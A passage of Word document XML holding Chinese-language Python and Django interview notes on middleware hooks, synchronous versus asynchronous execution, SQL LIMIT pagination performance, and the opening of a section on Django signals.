        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中间件：允许开发人员在请求之前或之后进行相应的处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216D01C0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE8F34C" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.10之前，Django中间件注册`MIDDLEWARE_CLASSES`:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CCA8E91" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        process_request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21CC1024" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">           process_view</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C940926" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        process_response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462FC900" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        process_template_response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323EE8CE" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        process_exception</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3275FE94" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B44223" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.10及之后，Django中间件注册`MIDDLWARE`:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655A38C4" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> simple_middleware(get_response):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377BC87A" w14:textId="03E89022" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 一次性配置和初始化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C6B9AD" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> middleware(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCDF505" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 在调用视图(以及稍后的中间件)之前</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083549CC" w14:textId="4F242507" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 要为每个请求执行代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D7B98C" w14:textId="23A2B32B" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">             response = get_response(request)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F5F46C" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>20</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 为每个请求/响应执行的代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339AD879" w14:textId="2919BC6C" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>21</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 在调用视图之后</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E7C573" w14:textId="49D1E086" w:rsidR="00D8288D" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>23</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75396D1B" w14:textId="42B0EFAE" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>25</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> middleware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC433C5" w14:textId="01D16CFD" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00C97D3B">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09F9C31D" wp14:editId="3D882494">
            <wp:extent cx="7867650" cy="381000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867650" cy="3810000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2639CB" w14:textId="27C74DF3"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024</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>同步和异步有什么区别，</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何实现异步同步：多个任务之间有先后顺序执行，一个执行完下个才能执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2730F2A8" w14:textId="35689EB7" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>异步：多个任务之间没有先后顺序，可以同时执行</w:t>
      </w:r>
      <w:r w:rsidR="00C97D3B">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>有时候一个任务可能要在必要的时候获取另一个同时执行的任务的结果，这个就叫回调</w:t>
      </w:r>
      <w:r w:rsidR="00C97D3B">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD9DAEB" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>阻塞：如果卡住了调用者，调用者不能继续往下执行，就是说调用者阻塞了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB03294" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>非阻塞：如果不会卡住，可以继续执行，就是说非阻塞的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75911CFF" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>同步异步相对于多任务而言，阻塞非阻塞相对于代码执行而言</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A752EB7" w14:textId="5349EB75" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>答celery可以 asyncio可以了解一下</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F323AA8" w14:textId="3A6F160C"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025</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>语句中使用</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>遇到哪些问题，是如何解决的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2501266F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>日常分页SQL语句</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382C3D47" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">select id,name,content </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> users order by id asc limit 100000,20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1437952D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>扫描100020行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3362A4A8" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>如果记录了上次的最大ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A539B8B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">select id,name,content </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> users where id&gt;100073 order by id asc limit 20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52AA81FB" w14:textId="5BC35AA4" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>扫描20行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72494BC7" w14:textId="77DE6FDD"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026</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django Signals</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>信号简单使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00ED0A15"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expand"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-expand"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>信号的定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A8739D"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line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>所有信号都是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>django.core.signals.Signal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的实例。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
